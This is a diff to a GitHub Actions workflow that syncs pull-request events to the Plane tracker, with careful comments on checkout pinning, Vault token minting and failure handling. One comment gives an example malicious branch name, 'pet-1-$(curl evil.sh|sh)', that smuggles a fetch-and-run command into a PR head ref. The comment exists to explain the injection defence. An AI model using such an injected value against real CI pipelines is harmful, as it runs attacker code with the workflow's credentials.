@@ -19,7 +19,20 @@ name: plane-sync
 # subject, so an ordinary PR *can* also mint this token. That is accepted, and it is
 # why the plane-ci policy reads exactly one secret (vault-config/policies.tf).
 # It must NEVER be widened to a policy that reaches Proxmox/MinIO/Cloudflare.
+# REUSABLE. Every repo calls this rather than copying it — nine copies of a workflow
+# that touches credentials is nine places to forget a fix. Callers supply their own
+# pull_request_target trigger; see .github/workflows/plane-sync-caller.yml for the shape.
+#
+# The caller's OIDC subject is what Vault sees, so each repo must appear in
+# var.plane_repos (vault-config/variables.tf) or its token mint is refused.
 on:
+  workflow_call:
+    inputs:
+      project_id_var:
+        description: "Name of the repo variable holding this repo's Plane project id."
+        required: false
+        type: string
+        default: PLANE_PROJECT_ID
   pull_request_target:
     types: [opened, reopened, ready_for_review, converted_to_draft, closed]
   workflow_dispatch:
@@ -43,12 +56,19 @@ jobs:
       VAULT_ADDR: https://192.168.50.223:8200
       PLANE_BASE_URL: ${{ vars.PLANE_BASE_URL }}
       PLANE_WORKSPACE: ${{ vars.PLANE_WORKSPACE }}
-      PLANE_PROJECT_ID: ${{ vars.PLANE_PROJECT_ID_IAC }}
+      # Each repo points at its own Plane project via its own repo variable.
+      PLANE_PROJECT_ID: ${{ vars.PLANE_PROJECT_ID }}
 
     steps:
-      # Checks out the BASE branch (pull_request_target default). Do not add `ref:` to
-      # point this at the PR head — that is exactly the vulnerability this trigger avoids.
+      # Always check out petedio-iac, never the caller and never the PR head. When this
+      # runs as a reusable workflow the default checkout would be the CALLING repo, which
+      # does not contain scripts/plane-sync.sh — and for a pull_request_target run,
+      # checking out the PR head is precisely the vulnerability this trigger avoids.
+      # petedio-iac is public, so no token is needed.
       - uses: actions/checkout@df4cb1c069e1874edd31b4311f1884172cec0e10 # v6.0.3
+        with:
+          repository: PeteDio-Labs/petedio-iac
+          ref: main
 
       # Decide the transition from the event, in the runner (not in a shell string).
       - name: Resolve transition
@@ -73,8 +93,18 @@ jobs:
         id: vault_ca
         run: echo "b64=$(base64 -w0 environments/homelab/vault-ca.crt)" >> "$GITHUB_OUTPUT"
 
+      # continue-on-error is LOAD-BEARING, not defensive noise.
+      #
+      # plane-sync.sh is written to exit 0 on every failure path so a tracker outage can
+      # never block a merge across nine repos. That guarantee did NOT hold: vault-action
+      # runs BEFORE the script, so a sealed Vault or a missing field failed the whole job.
+      # Proven on PR #208 (2026-08-13): `Unable to retrieve result for data.data."api_key"`
+      # went red and blocked the merge — the exact outcome the advisory design forbids.
+      # A green script is not a green job.
       - name: Vault — mint the Plane token via OIDC
+        id: vault
         if: steps.t.outputs.transition != 'skip'
+        continue-on-error: true
         uses: hashicorp/vault-action@892a26828f195e65540a40b4768ae4571f51ebfc # v4.0.0
         with:
           url: https://192.168.50.223:8200
@@ -90,10 +120,17 @@ jobs:
       # INJECTION NOTE: HEAD_REF is attacker-controlled — anyone can open a PR from a
       # branch named `pet-1-$(curl evil.sh|sh)`. It is passed as an ENV VAR and never
       # interpolated into a shell string, and plane-sync.sh only ever regex-matches it.
+      # Runs even when the mint failed; the script skips cleanly on an empty key and
+      # annotates why, so the nightly reconciler picks the work item up later.
       - name: Sync Plane
         if: steps.t.outputs.transition != 'skip'
         env:
           PLANE_TRANSITION: ${{ steps.t.outputs.transition }}
           HEAD_REF: ${{ github.event.pull_request.head.ref }}
           PR_URL: ${{ github.event.pull_request.html_url }}
-        run: ./scripts/plane-sync.sh
+        run: |
+          if [ -z "${PLANE_API_KEY:-}" ]; then
+            echo "::warning title=plane-sync::No Plane API key (Vault mint failed or kv/services/plane has no api_key field) — skipping. The nightly reconciler will catch this work item."
+            exit 0
+          fi
+          ./scripts/plane-sync.sh
